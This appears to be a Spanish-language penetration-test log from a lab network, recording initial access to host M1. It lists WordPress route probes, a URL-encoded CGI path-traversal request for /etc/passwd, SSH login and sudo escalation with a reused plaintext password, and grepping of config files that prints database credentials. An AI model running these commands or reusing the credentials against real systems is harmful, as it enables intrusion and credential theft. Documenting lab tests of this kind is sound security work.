# Bitácora · Fase 3 · Acceso inicial a M1

Fecha UTC: 2026-10-24 · Ejecuta: M6 `10.10.10.20` → M1 `10.10.10.11`

| ID | Comando | Explicación | Salida real (resumen) | Evidencia | Lectura |
|---|---|---|---|---|---|
| CMD-F03-001 | `curl -s http://wp.uni.lab/wp-json/ \| grep -o 'batch[^"]*'` | Busca la ruta batch de W1 | `batch\/v1` | `F03-001` | La ruta de wp2shell existe |
| CMD-F03-002 | `curl -s -o /dev/null -w '%{http_code}\n' http://wp.uni.lab/wp-json/batch/v1` | GET a la ruta | `404` | `F03-001` | Comportamiento normal de la ruta |
| CMD-F03-003 | `curl -s -X POST -H 'Content-Type: application/json' -d '{}' -o /dev/null -w '%{http_code}\n' http://wp.uni.lab/wp-json/batch/v1` | POST vacío | `400` | `F03-001` | La ruta procesa POST; precondición de W1 |
| CMD-F03-004 | `curl -c /tmp/wp.cookies http://wp.uni.lab/wp-login.php` + POST `log=usc.admin&pwd=Admin13.-` | Login W4 | `302 Found`; `Set-Cookie: wordpress_logged_in...`; `Location: /wp-admin/` | `F03-001` | Credenciales válidas; acceso admin |
| CMD-F03-005 | `curl -s -o /dev/null -w '%{http_code}\n' http://wp.uni.lab/cgi-bin/` | Comprueba CGI | `403` | `F03-002` | CGI presente pero protegido/roto |
| CMD-F03-006 | `curl -s --path-as-is 'http://wp.uni.lab/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd'` | W3 traversal | `503 Service Unavailable` | `F03-002` | No explotable: `mod_cgid` sin daemon |
| CMD-F03-007 | `sshpass -p 'Admin13.-' ssh ubuntu@10.10.10.11 'id; hostname; ip -brief a'` | Acceso SSH con clave reutilizada | `uid=1000(ubuntu)`; `m1-app`; `10.10.10.11/24` | `F04-000` | Acceso real a M1 |
| CMD-F03-008 | `echo Admin13.- \| sudo -S id` (en M1) | Escalada por sudo | `uid=0(root)` | `F04-000b` | Root en M1 con la misma clave |
| CMD-F03-009 | `sudo grep -E 'DB_NAME\|DB_USER\|DB_PASSWORD\|DB_HOST' /var/www/wp/wp-config.php` | Botín de configuración | `wordpress`, `wp_user`, `wp_pass123`, `10.10.10.12` | `F04-004` | Credenciales reales para M2 |
| CMD-F03-010 | `sudo grep -E 'dbuser\|dbpass' /var/www/moodle/config.php` | Botín Moodle | `moodle_user`, `wp_pass123` | `F04-004b` | Mismas credenciales para `moodle_db` |

**Resultado:** W4 validado; W1 fingerprint; W3 no explotable; SSH + sudo dan root en M1; credenciales de BD obtenidas.

**Nota de honestidad:** no se ejecutó un PoC de W1/W2 que devolviera `www-data`. El acceso real fue W4 + SSH. Cualquier afirmación de RCE pre-auth queda pendiente de evidencia.
